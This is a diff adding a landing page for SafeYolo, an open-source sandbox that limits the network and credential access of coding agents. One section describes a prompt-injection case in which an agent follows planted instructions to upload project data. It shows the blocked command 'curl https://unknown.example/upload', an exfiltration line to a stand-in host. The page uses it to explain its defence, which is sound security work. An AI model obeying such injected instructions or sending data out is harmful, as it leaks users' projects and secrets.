@@ -1,0 +1,146 @@
+---
+layout: default
+landing: true
+permalink: /
+title: "SafeYolo: Sandboxed coding agents with controlled network and service access"
+---
+<section class="hero">
+  <div class="wrap hero-grid">
+    <div>
+      <h1>SafeYolo</h1>
+      <p class="tagline">Let coding agents work. Control where they can reach.</p>
+      <p>SafeYolo runs Claude Code, OpenAI Codex and other coding agents in isolated Linux sandboxes with controlled network and service access.</p>
+      <p>Give agents guest-local root to install tools, run browsers, start services and debug code - without giving them unrestricted access to your host or the Internet.</p>
+      <div class="actions">
+        <a class="btn primary" href="https://github.com/craigbalding/safeyolo">View on GitHub</a>
+        <a class="btn ghost" href="#start">Learn More</a>
+      </div>
+      <p class="meta">Pre-v1 · Open source · macOS Apple Silicon + Linux<br>Built by <a href="https://threatspotting.com/">Threatspotting</a></p>
+    </div>
+    <div class="hero-mark"><img src="/assets/img/safeyolo-mark.svg" alt="" width="360" height="180"></div>
+  </div>
+</section>
+
+<section class="band" id="start">
+  <div class="wrap split">
+    <div>
+      <p class="kicker">The problem</p>
+      <h2>Agents need freedom to work. That shouldn't mean unlimited authority.</h2>
+    </div>
+    <div>
+      <p>Coding agents install packages, launch browsers, run development servers, call APIs and increasingly work unattended for long periods.</p>
+      <p>Approve every operation and you lose the autonomy.</p>
+      <p>Give the agent your machine and unrestricted network access and every mistake, injected instruction or runaway loop gets the same authority you do.</p>
+      <p><em>The useful boundary is different</em>:</p>
+      <ul class="checks">
+        <li>Root inside the agent's sandbox, not on your host</li>
+        <li>Explicit external destinations and service capabilities</li>
+        <li>Service credentials kept outside the agent where possible</li>
+        <li>Limits on runaway network activity</li>
+        <li>A record of what the agent attempted and why it was allowed or blocked</li>
+      </ul>
+      <p class="statement">SafeYolo separates local freedom from external authority.</p>
+    </div>
+  </div>
+</section>
+
+<section class="band alt">
+  <div class="wrap">
+    <p class="kicker">What SafeYolo does</p>
+    <div class="cards">
+      <div class="card"><h3>Isolated workspace</h3><p>Each agent gets its own Linux sandbox and persistent home: hardware-backed microVMs on Apple Silicon macOS, rootless gVisor on Linux.</p></div>
+      <div class="card"><h3>Controlled network access</h3><p>The sandbox has no external network interface.</p><p>Traffic leaves through SafeYolo, with per-agent policy for destinations, approvals, rate budgets and service capabilities.</p></div>
+      <div class="card"><h3>Protected service credentials</h3><p>The service gateway can keep credentials on the trusted host and inject them only into authorised requests.</p><p>Credential guards restrict where detected secrets may be sent.</p></div>
+      <div class="card"><h3>Visible work</h3><p>Inspect HTTP(S) traffic and open sandboxed browser or desktop previews while the agent works.</p></div>
+      <div class="card"><h3>Limits and evidence</h3><p>Rate budgets, circuit breakers and loop detection constrain runaway activity.</p><p>Structured audit records preserve requests, decisions and block reasons.</p></div>
+    </div>
+  </div>
+</section>
+
+<section class="band">
+  <div class="wrap split">
+    <div>
+      <p class="kicker">How it fits</p>
+<pre class="ascii">YOUR TRUSTED HOST
+  Policy · approvals · credential vault
+  SafeYolo enforcement
+          │
+ controls │ boundary
+          │
+AGENT SANDBOX — UNTRUSTED
+  Claude Code / Codex / tools
+  Guest-local root
+  Your selected workspace
+  No direct external network
+          │
+          ▼
+EXTERNAL SERVICES
+  Only through SafeYolo policy</pre>
+    </div>
+    <div>
+      <p>On macOS: hardware-backed Linux microVMs.<br>On Linux: rootless gVisor.</p>
+    </div>
+  </div>
+</section>
+
+<section class="band dark">
+  <div class="wrap split">
+    <div>
+      <p class="kicker">A real failure mode</p>
+      <p>An agent encounters instructions in an issue, dependency or web page telling it to send project data to an external service.</p>
+      <p>It complies.</p>
+    </div>
+    <div>
+      <div class="term"><div><span class="prompt">agent$</span> curl https://unknown.example/upload ...</div><div class="bad">HTTP 428 — access not authorised</div><div class="dim">Destination is outside this agent's policy.</div></div>
+      <p>The agent cannot route around SafeYolo, its sandbox has no direct external network interface.</p>
+      <p>If the request uses a service configured through SafeYolo's gateway, the real service credential can remain on the host and is injected only after the request is authorised.</p>
+      <p>The attempt - including the policy decision and reason - is recorded for the operator.</p>
+      <div class="actions"><a class="btn dark" href="https://github.com/craigbalding/safeyolo">See demos in README</a></div>
+    </div>
+  </div>
+</section>
+
+<section class="band" id="install">
+  <div class="wrap split">
+    <div>
+      <p class="kicker">Install</p>
+      <p>SafeYolo is currently pre-v1 and installed from source.</p>
+      <p>macOS requires Apple Silicon, Command Line Tools, Lima and tmux. Linux supports x86_64 and arm64 and uses gVisor for sandboxing.</p>
+      <div class="actions"><a class="btn dark" href="https://github.com/craigbalding/safeyolo">Install / Run (GitHub)</a></div>
+    </div>
+    <div class="term"><div><span class="prompt">$</span> git clone https://github.com/craigbalding/safeyolo.git</div><div><span class="prompt">$</span> cd safeyolo</div><div><span class="prompt">$</span> ./install.sh</div><div><span class="prompt">$</span> safeyolo bootstrap</div><div class="dim"># On macOS:</div><div><span class="prompt">$</span> make -C vm install</div><div class="dim"># Then</div><div><span class="prompt">$</span> safeyolo agent add work ~/code --host-script @claude</div><div><span class="prompt">$</span> safeyolo agent run work</div></div>
+  </div>
+</section>
+
+<section class="band alt">
+  <div class="wrap">
+    <p class="kicker">Who it’s for</p>
+    <div class="cards">
+      <div class="card"><p>Developers who want Claude Code, Codex or similar agents to work autonomously without giving them unrestricted host and network access</p></div>
+      <div class="card"><p>Teams running persistent or multiple coding agents that need per-agent boundaries, visibility and audit evidence</p></div>
+      <div class="card"><p>Security engineers using agents for browsers, APIs, testing and other workflows where external access needs to be controlled</p></div>
+      <div class="card"><p>Organisations experimenting with agent autonomy but unwilling to make “let it work” synonymous with “trust it with everything”</p></div>
+    </div>
+  </div>
+</section>
+
+<section class="band" id="help">
+  <div class="wrap person">
+    <img src="/assets/img/craig-balding.jpg" alt="Headshot of Craig Balding" width="180" height="233">
+    <div>
+      <p class="kicker">Help / commercial</p>
+      <p>SafeYolo is MIT-licensed open-source software.</p>
+      <p>Threatspotting can help organisations use autonomous coding agents safely in real environments, including:</p>
+      <ul class="checks">
+        <li>Agent sandbox and trust-boundary design</li>
+        <li>SafeYolo deployment and policy design</li>
+        <li>Service capability and credential architecture</li>
+        <li>Adversarial testing of agent containment and controls</li>
+        <li>Independent assurance and security review</li>
+        <li>Practical agent-security training for engineering and security teams</li>
+      </ul>
+      <p>I've worked both sides of this problem: building security controls in regulated environments and breaking systems to test whether those controls really work.</p>
+      <p><a href="mailto:craig@threatspotting.com">Email: craig@threatspotting.com</a></p>
+    </div>
+  </div>
+</section>
